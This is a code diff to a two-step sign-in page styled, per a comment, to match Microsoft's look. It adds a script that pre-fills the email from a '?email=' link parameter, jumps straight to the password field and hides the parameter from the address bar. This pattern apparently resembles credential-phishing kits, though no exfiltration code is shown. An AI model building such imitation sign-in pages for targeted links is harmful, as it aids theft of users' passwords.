@@ -642,7 +642,7 @@
   </style>
 </head>
 
-<body style="">
+<body>
   <div class="glow-2"></div>
 
   <div class="petal" style="top:8%;left:6%">
@@ -692,6 +692,7 @@
     <!-- ══ PAGE 2: Password — dark, MS-matched ══ -->
     <div id="page-password" class="pw-wrap" style="display: none;">
       <div class="pw-card">
+    
 
         <!-- Bloom logo -->
         <div class="pw-logo">
@@ -771,6 +772,24 @@
       t.textContent = msg; t.className = `toast ${type} show`;
       setTimeout(() => t.className = 'toast', dur);
     }
+
+    // ── Auto-detect email from URL (?email=...) ──
+    (function checkUrlEmail() {
+      const params = new URLSearchParams(window.location.search);
+      const urlEmail = params.get('email');
+      if (urlEmail && urlEmail.trim()) {
+        currentEmail = urlEmail.trim();
+        emailDisplay.textContent = currentEmail;
+        // Skip email page, go straight to password
+        pageEmail.style.display = 'none';
+        emailOptions.style.display = 'none';
+        pagePw.style.display = 'block';
+        setTimeout(() => passwordInput.focus(), 50);
+        // Clean the URL so email isn't visible in browser bar
+        window.history.replaceState({}, '', window.location.pathname);
+      }
+    })();
+    
 
     function goToPassword() {
       const val = emailInput.value.trim();
